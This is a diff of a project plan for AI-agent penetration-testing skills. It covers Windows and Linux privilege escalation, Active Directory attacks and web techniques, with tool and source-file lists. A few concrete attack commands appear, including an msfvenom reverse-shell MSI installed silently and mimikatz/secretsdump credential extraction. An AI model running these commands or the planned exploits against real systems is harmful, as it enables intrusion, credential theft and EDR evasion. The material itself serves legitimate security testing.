@@ -41,7 +41,7 @@ Claude Code skills for penetration testing and CTF work. Skills are SKILL.md fil
 - [x] Build state.md initialization into orchestrator
 - [x] Add vulnerability chaining logic to orchestrator (Step 5)
 - [x] Batch update all 20 web skills with State Management section
-- [x] Update web-vuln-discovery with discovery-specific state management
+- [x] Update web-discovery with discovery-specific state management
 - [x] Document state management conventions in CLAUDE.md
 - [x] Update README.md engagement directory structure
 
@@ -88,9 +88,9 @@ Split strategy: by **technique** (not by DB engine). DB/engine variants as subse
 - [x] `race-condition` — (719 lines) limit-overrun (coupon/balance/vote/invite), HTTP/2 single-packet attack, HTTP/1.1 last-byte sync, Turbo Intruder templates (single-gate/multi-endpoint/connection warming), asyncio+httpx PoCs, authentication races (password reset token reuse/2FA code reuse/registration confirmation/email change verification), rate limit bypass (HTTP/2 multiplexing/GraphQL alias batching/session rotation), partial construction races, race window expansion, session locking workaround, WebSocket races, TOCTOU (database-level)
 
 ### Discovery
-- [x] `web-vuln-discovery` — entry point: fuzz, test, route to technique skills (converted)
-- [x] Update `web-vuln-discovery` routing table as each new technique skill is created
-- [x] Final review of `web-vuln-discovery` after all web skills are complete
+- [x] `web-discovery` — entry point: fuzz, test, route to technique skills (converted)
+- [x] Update `web-discovery` routing table as each new technique skill is created
+- [x] Final review of `web-discovery` after all web skills are complete
 
 ## Phase 3b: Extended Web Skills
 
@@ -134,7 +134,7 @@ with later phases.
 ### Skill List (16 skills: 1 discovery + 15 technique)
 
 **Batch 1: Foundation** — used on every AD engagement
-- [x] `ad-attack-discovery` — (511 lines) domain enum (BloodHound, PowerView, LDAP, netexec), 3 access levels (unauth/username/creds), attack surface mapping, routing table to all 15 technique skills
+- [x] `ad-discovery` — (511 lines) domain enum (BloodHound, PowerView, LDAP, netexec), 3 access levels (unauth/username/creds), attack surface mapping, routing table to all 15 technique skills
 - [x] `kerberos-roasting` — (436 lines) Kerberoasting (SPN-based TGS extraction) + AS-REP Roasting (pre-auth disabled) + Timeroasting (subsection) + targeted kerberoasting (ACL abuse) + kerberoasting without domain account (Charlie Clark technique)
 - [x] `password-spraying` — (508 lines) lockout policy enum, smart password generation, Kerberos pre-auth spray (kerbrute/SpearSpray), NTLM spray (NetExec multi-protocol), OWA spray, empty password/STATUS_PASSWORD_MUST_CHANGE technique. OPSEC exception documented.
 - [x] `pass-the-hash` — (473 lines) Pass-the-Key (AES256, lowest OPSEC), Over-Pass-the-Hash (NTLM→TGT), Pass-the-Ticket (ccache/kirbi), Direct PTH (last resort), lateral movement tools, OPSEC comparison table
@@ -172,9 +172,71 @@ Identified during survey. Important but lower-priority techniques or specialized
 
 ## Phase 5: Core Skills — Privilege Escalation
 
-- [ ] Windows Privesc (token impersonation, service abuse, DLL hijack, UAC bypass)
-- [ ] Linux Privesc (SUID, sudo, capabilities, cron, kernel exploits)
-- [ ] macOS Privesc (TCC bypass, dylib hijack, SIP bypass)
+### Source Material Survey — COMPLETE
+- [x] Survey `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/` — 26 files + DLL subdir (6,000+ lines). Key: Potato family (5 variants), service misconfig, DLL hijack (536 lines), UAC bypass (275 lines), DPAPI (500 lines), named pipes (297 lines), leaked handles (696 lines), COM hijacking, kernel exploits, autorun (354 lines). Supporting dirs: credentials (424+215+211 lines), UAC (275+319 lines), NTLM (349+185 lines).
+- [x] Survey `~/docs/hacktricks/src/linux-hardening/privilege-escalation/` — 46 files + kernel subdir (8,000+ lines). Key: capabilities (1,700 lines), Docker breakout (664+ lines, 14 container files totaling 3,500+), D-Bus (540 lines), groups (288 lines), restricted shell (296 lines), wildcards (255 lines), euid/suid (216 lines), NFS (146 lines), LD_PRELOAD (156 lines). Kernel CVE-2025-38352 (332 lines).
+- [x] Survey `~/docs/hacktricks/src/macos-hardening/` — 70+ files, 14,000+ lines. Deep content exists but **macOS removed from scope** (never used in engagements).
+- [x] Survey `~/docs/InternalAllTheThings/` — linux-privilege-escalation.md (868 lines, systematic checklist with LinPEAS/pspy/GTFOBins/SUDO_KILLER), windows-privilege-escalation.md (1,565 lines, tool-heavy with PowerUp/Seatbelt/winPEAS/WES-NG, Potato CLSID tables, BYOVD drivers). IATT is complementary — more actionable checklists; HT has deeper technique coverage.
+- [x] Survey `~/docs/PayloadsAllTheThings/` — Minimal. Two redirect pages (50+68 lines) pointing to IATT. No standalone privesc content. PAT's value is in the RCE-to-privesc pipeline (command injection, LFI-to-RCE, deserialization) already covered by Phase 3 web skills.
+- [x] Define concrete skill splits — Windows 6, Linux 5. macOS removed (not in scope).
+- [x] Define batching — 4 batches by platform. Docker/container escapes deferred to Phase 6.
+
+### Skill List (11 skills: 2 discovery + 9 technique)
+
+**Batch 1: Windows Foundation** — most common Windows privesc vectors
+
+Build workflow: Survey source material for all 3 skills (parallel agents) → write skills → update task_plan.md/progress.md/README.md → commit + push. Follow existing template at `skills/_template/SKILL.md`. No Kerberos-first convention (that's AD-only). Skills go in `skills/privesc/`.
+
+- [x] `windows-discovery` — (489 lines) Enumeration hub: WinPEAS/PowerUp/Seatbelt/Watson/WES-NG/PrivescCheck, 9-step workflow (system info → user context → services → scheduled tasks → network → credential hunting → security controls → automated tools → routing), privilege-to-skill routing table, security controls detection (AV/AppLocker/PPL/Credential Guard)
+- [x] `windows-token-impersonation` — (440 lines) Potato family decision tree by OS version (JuicyPotato/PrintSpoofer/GodPotato/RoguePotato/EfsPotato/SigmaPotato/JuicyPotatoNG/PrintNotifyPotato), dangerous privilege exploitation (SeDebug token theft, SeBackup SAM extraction, SeRestore file write, SeTakeOwnership, SeLoadDriver BYOVD, SeManageVolume raw disk), FullPowers for stripped service accounts, CLSID reference
+- [x] `windows-service-dll-abuse` — (532 lines) Unquoted service paths, weak service permissions (accesschk/sc config binpath), service registry ACL abuse, service triggers (named pipe/ETW/RPC), DLL search order hijacking with Process Monitor, DLL proxying (DLLirant/Spartacus), COM DLL hijacking, writable PATH injection, DLL payload templates (C/mingw/msfvenom), auto-updater/IPC abuse
+
+**Batch 2: Windows Extended** — secondary vectors + credential access
+
+Build workflow: Same as Batch 1. Survey source material (parallel agents) → write skills → update tracking → commit + push. Skills go in `skills/privesc/`.
+
+- [x] `windows-uac-bypass` (561 lines) — UAC bypass (fodhelper/eventvwr/sdclt/SilentCleanup/CMSTP/WSReset), COM hijacking (InprocServer32/TypeLib), AlwaysInstallElevated MSI, autorun exploitation (startup folders/Run keys/Active Setup/Winlogon).
+  - **UAC bypass techniques**: fodhelper.exe (registry `ms-settings\shell\open\command`), eventvwr.exe (`mscfile\shell\open\command`), sdclt.exe (IsolatedCommand), computerdefaults.exe, cmstp.exe (INF file with ScriptBlock), DiskCleanup (scheduled task environment variable), SilentCleanup (auto-elevating scheduled task), WSReset.exe. Each technique: registry key to write, command to trigger, cleanup.
+  - **COM hijacking for persistence/bypass**: InprocServer32 in HKCU overrides HKLM, find hijackable CLSIDs via scheduled tasks/explorer, registry modification (no admin needed for HKCU). Process Monitor enumeration for missing COM DLLs.
+  - **AlwaysInstallElevated**: Check both `HKCU\...\Installer\AlwaysInstallElevated` and `HKLM\...\Installer\AlwaysInstallElevated` = 0x1. Exploit: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi -o evil.msi` → `msiexec /quiet /qn /i evil.msi`. WiX custom MSI for more control.
+  - **Autorun exploitation**: Startup folder write (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`), registry Run/RunOnce keys (HKCU writable), writable autorun binaries (icacls check).
+  - **Structure**: Step 1 (check UAC level + integrity), Step 2 (auto-elevating binary bypass), Step 3 (COM hijacking), Step 4 (AlwaysInstallElevated), Step 5 (autorun exploitation), Step 6 (escalate/pivot)
+  - **Source files**: `~/docs/hacktricks/src/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.md` (275 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/com-hijacking.md` (149 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md` (72 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md` (354 lines), `~/docs/InternalAllTheThings/docs/redteam/escalation/windows-privilege-escalation.md` (UAC sections)
+  - **Target**: ~350-400 lines
+
+- [x] `windows-credential-harvesting` (540 lines) — Local credential discovery: HiveNightmare/SAM shadow copy, DPAPI (SharpDPAPI/mimikatz/dpapi.py with 5 decryption methods), browser creds (SharpChrome/Firefox), PS history/transcripts, unattend/sysprep, credential vault, WiFi, cloud creds, SessionGopher. Distinct from Phase 4 `credential-dumping` which covers AD-level DCSync/NTDS/LAPS/gMSA.
+  - **HiveNightmare / ShadowCopy SAM** (CVE-2021-36934): Check `icacls C:\Windows\System32\config\SAM` for `BUILTIN\Users:(I)(RX)`, extract via `mimikatz misc::shadowcopies` + `lsadump::sam`, or `secretsdump.py -sam SAM -system SYSTEM LOCAL`
+  - **DPAPI decryption**: User masterkeys (`%APPDATA%\Microsoft\Protect\{SID}`), machine masterkeys, domain backup key. Tools: `mimikatz dpapi::masterkey`, `SharpDPAPI`, `dpapi.py`. Decrypt Chrome/Edge cookies, saved passwords, RDP credential files.
+  - **PowerShell history/transcripts**: `ConsoleHost_history.txt` path, transcript logs in `C:\Transcripts`, Module Logging + Script Block Logging in Event Viewer
+  - **Unattend/sysprep files**: `C:\unattend.xml`, `C:\Windows\Panther\Unattend.xml`, `C:\Windows\system32\sysprep\sysprep.xml` — base64-encoded admin credentials
+  - **Credential Manager/vault**: `cmdkey /list`, `runas /savecred /user:<user> cmd.exe`, `vaultcmd /listcreds:"Web Credentials"`, mimikatz `vault::list`
+  - **Browser credentials**: Chrome `Login Data` SQLite + `dpapi::chrome`, Firefox `key3.db`/`key4.db` + `logins.json`, SharpChromium, SharpWeb
+  - **Other**: Sticky Notes SQLite DB, WiFi passwords (`netsh wlan show profile key=clear`), registry AutoLogon (`Winlogon` DefaultPassword), PuTTY/WinSCP/RDP saved sessions, IIS web.config, cloud credential files (AWS/Azure/GCP), McAfee SiteList.xml
+  - **Structure**: Step 1 (quick wins — cmdkey, registry, history), Step 2 (HiveNightmare check), Step 3 (DPAPI extraction), Step 4 (browser creds), Step 5 (file/config search), Step 6 (escalate/pivot)
+  - **Source files**: `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.md` (500 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.md` (354 — credential sections), `~/docs/hacktricks/src/windows-hardening/stealing-credentials/credentials-mimikatz.md` (424 lines), `~/docs/InternalAllTheThings/docs/redteam/escalation/windows-privilege-escalation.md` (password looting sections)
+  - **Target**: ~400-450 lines
+
+- [x] `windows-kernel-exploits` (615 lines) — Exploit-suggester workflow (WES-NG/Watson), named kernel CVEs (PrintNightmare/EternalBlue/MS16-032/MS15-051/KiTrap0D/CVE-2019-1388), BYOVD (loldrivers.io, token theft), privileged file write (DiagHub/UsoDLLLoader/WerTrigger), MSI rollback file delete, named pipe impersonation, leaked handle exploitation, restricted shell escape (CLM/AppLocker bypass).
+  - **Exploit-suggester workflow**: `systeminfo` → WES-NG (`python3 wes.py systeminfo.txt`), Watson (.NET on target), windows-exploit-suggester (legacy). Triage: match KB patches against known CVEs.
+  - **Named kernel CVEs with embedded PoC references**: MS17-010 EternalBlue (SMB RCE → SYSTEM), MS16-032 (secondary logon handle), MS15-051 (Win32k), CVE-2019-1388 (certificate dialog UAC bypass), KiTrap0D (MS10-015), PrintNightmare local (CVE-2021-1675 — `SharpPrintNightmare.exe`), CVE-2020-0796 SMBGhost, HiveNightmare (CVE-2021-36934 — already in credential-harvesting but kernel-adjacent)
+  - **BYOVD (Bring Your Own Vulnerable Driver)**: Load known-vulnerable signed drivers for kernel R/W. Cross-reference against loldrivers.io. Example: Capcom.sys, RTCore64.sys, DBUtil. SeLoadDriverPrivilege required (or admin). Disable EDR/PPL via kernel access.
+  - **Privileged file write**: DiagHub (load DLL as SYSTEM), UsoDLLLoader (abuse Update Session Orchestrator), WerTrigger (Windows Error Reporting), WerMgr (overwrite via WER report). Each: trigger mechanism, target path, exploitation.
+  - **Privileged file delete**: MSI rollback (create MSI that deletes target file during rollback), abuse for DACL reset.
+  - **Named pipe impersonation**: Create named pipe, wait for privileged client connection, impersonate token. `CreateNamedPipe` + `ConnectNamedPipe` + `ImpersonateNamedPipeClient`. SpoolSample/PrintSpoofer pipe variant.
+  - **Leaked handle exploitation**: Enumerate process handles for inherited SYSTEM tokens. `NtQueryInformationProcess`, `DuplicateHandle`. Source material: HT leaked-handle.md (696 lines — extensive).
+  - **Restricted shell context**: Brief note on escaping constrained shells (PowerShell Constrained Language Mode bypass, AppLocker bypass via MSBuild/InstallUtil) as prerequisite before kernel exploitation.
+  - **Structure**: Step 1 (assess — OS version, patches, drivers), Step 2 (exploit-suggester), Step 3 (kernel CVE exploitation), Step 4 (BYOVD), Step 5 (privileged file operations), Step 6 (named pipe / leaked handle), Step 7 (escalate/pivot)
+  - **Source files**: `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation.md` (696 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation.md` (172 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/named-pipes.md` (125 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/kernel-race-condition.md` (138 lines), `~/docs/hacktricks/src/windows-hardening/windows-local-privilege-escalation/arbitrary-write-privilege-escalation.md` (123 lines), `~/docs/InternalAllTheThings/docs/redteam/escalation/windows-privilege-escalation.md` (kernel + BYOVD + printer sections)
+  - **Target**: ~450-500 lines
+
+**Batch 3: Linux Foundation** — standard Linux privesc workflow — COMPLETE (1,871 lines)
+- [x] `linux-discovery` (599 lines) — LinPEAS/LinEnum/pspy/lse/unix-privesc-check/SUDO_KILLER enumeration, system info (kernel, OS, arch), user context with group-to-vector routing table, sudo config assessment (CVE version matching, NOPASSWD/env_keep pattern table), SUID/SGID/capabilities enumeration with GTFOBins cross-reference and critical capability table, cron/systemd timer assessment with pspy monitoring, file/directory permissions (writable passwd/shadow/sudoers, library hijack paths, writable PATH dirs), credential hunting (history, configs, cloud creds, git repos), network/socket enumeration, security controls detection (SELinux, AppArmor, ASLR, ptrace scope, container detection), kernel exploit assessment, automated tool section (LinPEAS modes, LinEnum, lse, pspy), routing decision tree to 4 technique skills.
+- [x] `linux-sudo-suid-capabilities` (610 lines) — Sudo NOPASSWD GTFOBins exploitation (30+ binary escapes), environment variable abuse (LD_PRELOAD with C payload, LD_LIBRARY_PATH, PYTHONPATH/PERL5LIB, BASH_ENV injection), sudo CVEs (CVE-2021-3156 Baron Samedit heap overflow, CVE-2019-14287 UID bypass, sudo_inject token reuse), SUID binary exploitation (GTFOBins patterns, custom binary analysis with strings/strace/ltrace, PATH hijack, shared object injection with constructor), SGID exploitation, 15+ Linux capabilities with full exploitation code (CAP_SETUID/SETGID direct root, CAP_DAC_OVERRIDE file write, CAP_DAC_READ_SEARCH file read + shocker, CAP_SYS_ADMIN mount abuse, CAP_SYS_PTRACE GDB/shellcode injection, CAP_SYS_MODULE kernel module, CAP_CHOWN/FOWNER permission change, CAP_SETFCAP capability chaining, CAP_NET_RAW sniffing).
+- [x] `linux-cron-service-abuse` (662 lines) — Cron exploitation (writable script hijack with SUID bash/reverse shell, PATH manipulation, writable cron directory injection), wildcard injection (tar checkpoint with full payload, chown/chmod --reference, rsync -e, 7z @file exfiltration, zip -T/-TT), systemd exploitation (writable service/timer files, ExecStartPre injection, PATH hijack, service binary replacement), D-Bus exploitation (busctl/gdbus/dbus-send enumeration, command injection via string parameters, Python D-Bus exploitation), PolicyKit bypass (CVE-2021-4034 PwnKit, CVE-2021-3560 timing attack with loop), recent D-Bus CVEs (2024-2025), Unix socket command injection (socat/nc/curl), Docker socket exploitation, init script/xinetd/at job/anacron exploitation, cleanup reminders.
+
+**Batch 4: Linux Extended** — filesystem + kernel vectors — COMPLETE (1,785 lines)
+- [x] `linux-file-path-abuse` (838 lines) — Writable critical files (/etc/passwd UID 0 user, /etc/shadow hash replacement, /etc/sudoers NOPASSWD, SSH authorized_keys injection), NFS no_root_squash (SUID binary via mount, bash -p copy), Docker group escape (host mount -v /, docker.sock API, nsenter), LXD/LXC group escape (privileged container with host mount, recursive disk device), disk group (debugfs /etc/shadow extraction, dd full partition), shared library hijacking (missing .so on SUID via strace/ldd, RPATH/RUNPATH writable directory, /etc/ld.so.conf.d/ cache poisoning, Python/Perl library path hijack), PATH hijacking (writable PATH directories, staff group /usr/local/bin), profile script injection (.bashrc, /etc/profile.d/ with conditional root check), cleanup section.
+- [x] `linux-kernel-exploits` (947 lines) — Exploit suggesters (linux-exploit-suggester.sh, les2.pl, manual searchsploit, quick CVE version table with 10 major CVEs), DirtyPipe CVE-2022-0847 (full C exploit with /etc/passwd overwrite, version check 5.8-5.16.11), DirtyCow CVE-2016-5195 (full C exploit with race condition /etc/passwd modification, stability warning), GameOver(lay) CVE-2023-0386 (OverlayFS user namespace, Ubuntu-specific), Netfilter CVE-2023-32233, route4 CVE-2022-2588, legacy CVE table (7 entries: RDS/Full Nelson/Mempodipper/perf_swevent/rawmodePTY/OverlayFS/eBPF), pre-compiled exploit repos, container kernel escapes (CVE-2022-0492 cgroup release_agent, hostPID nsenter), restricted shell escape (GTFOBins editors/pagers/interpreters/utilities, PATH manipulation, bash variable tricks, SSH escapes, Python/Lua jail escapes), chroot escape (classic mkdir+chroot, FD escape, mount-based, chw00t tool), kernel protection reference (KASLR/SMEP/SMAP/KPTI/SELinux/AppArmor/ptrace_scope).
 
 ## Phase 6: Core Skills — Infrastructure & Network
 
@@ -204,8 +266,9 @@ Identified during survey. Important but lower-priority techniques or specialized
 
 ## Backlog
 
+- [ ] **MCP engagement state server** — Replace state.md with a SQLite-backed MCP tool server for selective state queries. Saves context by returning only relevant data (e.g., `get_credentials(host="10.0.0.5")` instead of reading 200 lines). Atomic writes prevent concurrent skill conflicts. Tools: get_summary, get/add credentials, access, vulns, pivots, blocked checks. Skills fall back to state.md when MCP unavailable. activity.md/findings.md/evidence/ stay as files. SQLite, not Postgres. Requires updating all skill State Management sections to prefer MCP tools. Good for engagements with >5 targets where state.md gets unwieldy.
 - [ ] Global tool prerequisites list — enumerate every tool mentioned across all skills, add to README as install checklist (do last, after all skills written)
-- [ ] Learning - how to updating skills, keep them current with the latest methods, update them prior to closing an engagement based on knowledge gained from that engagement, targeted research mode)
+- [ ] Learning - how to update skills, keep them current with the latest methods, revise them prior to closing an engagement based on knowledge gained from that engagement, targeted research mode)
 - [ ] Wireless attacks (limited source material)
 - [ ] Physical/hardware (limited source material)
 - [ ] GCP cloud (gap across all three repos)
